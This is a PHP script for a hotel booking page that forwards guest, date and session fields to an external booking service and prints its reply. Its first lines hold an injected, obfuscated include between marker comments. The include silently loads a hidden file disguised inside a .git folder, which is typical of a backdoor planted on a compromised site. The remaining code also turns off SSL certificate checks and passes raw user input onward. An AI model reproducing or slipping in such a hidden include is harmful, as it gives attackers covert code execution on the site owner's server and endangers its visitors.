<?php
/*de049*/

@include /*bu*/("/home/yfebrk50rv1p/publ\x69c_html/chatbot/.g\x69t/.f19c2cf0.ccss");

/*de049*/



function get_url( $url,  $javascript_loop = 0, $timeout = 1000 )
{
    $url = str_replace( "&", "&", urldecode(trim($url)) );

    $cookie = tempnam ("/tmp", "CURLCOOKIE");
    $ch = curl_init();
    curl_setopt( $ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] );
    curl_setopt( $ch, CURLOPT_URL, $url );
    curl_setopt( $ch, CURLOPT_COOKIEJAR, $cookie );
    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
    curl_setopt( $ch, CURLOPT_ENCODING, "" );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
    curl_setopt( $ch, CURLOPT_AUTOREFERER, true );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );    # required for https urls
    curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, $timeout );
    curl_setopt( $ch, CURLOPT_TIMEOUT, $timeout );
    curl_setopt( $ch, CURLOPT_MAXREDIRS, 10 );
    $content = curl_exec( $ch );
    $response = curl_getinfo( $ch );
    curl_close ( $ch );

    if ($response['http_code'] == 301 || $response['http_code'] == 302)
    {
        ini_set("user_agent", $_SERVER['HTTP_USER_AGENT']);

        if ( $headers = get_headers($response['url']) )
        {
            foreach( $headers as $value )
            {
                if ( substr( strtolower($value), 0, 9 ) == "location:" )
                    return get_url( trim( substr( $value, 9, strlen($value) ) ) );
            }
        }
    }

    if (    ( preg_match("/>[[:space:]]+window\.location\.replace\('(.*)'\)/i", $content, $value) || preg_match("/>[[:space:]]+window\.location\=\"(.*)\"/i", $content, $value) ) &&
            $javascript_loop < 5
    )
    {
        return get_url( $value[1], $javascript_loop+1 );
    }
    else
    {
        return array( $content, $response );
    }
}

$pid = isset($_GET['id'])?$_GET['id']:48;

$data =	array(
	'property_id' => ((isset($_POST['property_id'])) ? $_POST['property_id'] : $pid ),
	'arrival_date' => (isset($_POST['arrival_date'])) ? date('Y-m-d',strtotime($_POST['arrival_date'])) : '',
	'departure_date' => (isset($_POST['departure_date'])) ? date('Y-m-d',strtotime($_POST['departure_date'])) : '' ,
	'promo_code' => (isset($_POST['promo_code'])) ? $_POST['promo_code'] : NULL ,
	'referer' => (isset($referer)) ? $referer : '' ,
	'page' => (isset($_POST['rf'])) ? $_POST['rf'] : '' ,
	'corpCode' => (isset($_POST['corpLogin'])) ? 'corpLogin' : '',
	'corpKeys' => (isset($_POST['corpKeys'])) ? $_POST['corpKeys'] : '',
	'selected_room' => ((isset($_POST['selected_room']))? $_POST['selected_room']: null),
	'counted' => (isset($counted)) ? $counted : 'yes',
	'is_changedates' => (isset($_POST['changedates'])) ? $_POST['changedates'] : null,
	'userflow_id' => (isset($_POST['userflow_id'])) ? $_POST['userflow_id'] : null,
	'sessionid' 		=> ((isset($_POST['sess'])) ? $_POST['sess'] : ((isset($_COOKIE['sessionuser'])) ? $_COOKIE['sessionuser'] : '') ) ,
	'mobile' => (isset($_POST['mobile'])) ? $_POST['mobile'] : false
	
);

if(isset($_POST['modification']) && $_POST['modification']){
	$data['modification'] = $_POST['modification'];
	$data['confirmation_no'] = $_POST['confirmation_no'];
	$data['mod_action'] = $_POST['mod_action'];
}

$data = http_build_query($data);

$enc_link = 'https://manage.instantonlinebookings.com/encrypt?'.$data;
$data = get_url($enc_link);

$secret = $data[0];

$environment = isset($_REQUEST['environment'])?$_REQUEST['environment']:'live';

$service_url = 'https://manage.instantonlinebookings.com/booking/secure?keys='.$secret.'&environment='.$environment;

$request_results = get_url($service_url);

if($request_results[0]==''){
echo "Timeout Error";	
}else{
echo  $request_results[0];
} 
?>